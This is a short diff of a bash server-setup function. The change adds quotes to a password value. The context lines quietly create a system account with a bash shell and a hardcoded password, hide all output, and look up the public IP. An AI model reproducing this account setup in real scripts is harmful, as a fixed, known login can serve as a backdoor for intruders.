@@ -334,7 +334,7 @@ function password_default() {
     MYIP=$(curl -sS ipv4.icanhazip.com)
     userdel jame > /dev/null 2>&1
     Username="sensor 🥷"
-    Password=sensor 🥷
+    Password="sensor 🥷"
     mkdir -p /home/script/
     useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
